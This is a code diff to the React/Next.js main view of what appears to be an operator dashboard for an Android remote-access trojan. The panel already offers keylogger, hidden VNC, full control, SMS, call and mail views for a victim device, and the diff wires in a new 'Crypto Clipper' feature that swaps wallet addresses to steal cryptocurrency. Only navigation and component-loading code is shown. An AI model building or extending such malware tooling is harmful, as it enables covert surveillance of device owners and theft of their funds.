@@ -4,7 +4,7 @@ import { AndroidDevice } from "@/types";
 import dynamic from "next/dynamic";
 import DeviceOverview from "@/components/dashboard/DeviceOverview";
 import { Button } from "@/components/ui/button";
-import { MessageSquare, FolderOpen, Phone, Terminal, Mail, Package, Keyboard, EyeOff } from "lucide-react";
+import { MessageSquare, FolderOpen, Phone, Terminal, Mail, Package, Keyboard, EyeOff, Wallet } from "lucide-react";
 import { useState } from "react";
 
 // Lazy load heavy feature components
@@ -35,6 +35,9 @@ const Keylogger = dynamic(() => import("@/components/features/Keylogger"), {
 const HiddenVNC = dynamic(() => import("@/components/features/HiddenVNC"), {
   loading: () => <div className="p-6">Loading Hidden VNC...</div>,
 });
+const CryptoClipper = dynamic(() => import("@/components/features/CryptoClipper"), {
+  loading: () => <div className="p-6">Loading Crypto Clipper...</div>,
+});
 
 interface MainContentProps {
   device: AndroidDevice | null;
@@ -50,6 +53,7 @@ const navigationItems = [
   { id: "accounts", label: "Mails", icon: Mail },
   { id: "apps", label: "Apps", icon: Package },
   { id: "keylogger", label: "Keylogger", icon: Keyboard },
+  { id: "crypto", label: "Crypto Clipper", icon: Wallet },
   { id: "control", label: "Full Control", icon: Terminal },
   { id: "hidden-vnc", label: "Hidden VNC", icon: EyeOff },
 ];
@@ -95,6 +99,8 @@ export default function MainContent({ device, view, onViewSelect, userId }: Main
         return <AppsManager device={device} />;
       case "keylogger":
         return <Keylogger device={device} />;
+      case "crypto":
+        return <CryptoClipper device={device} />;
       case "camera":
         return <CameraView device={device} />;
       case "control":
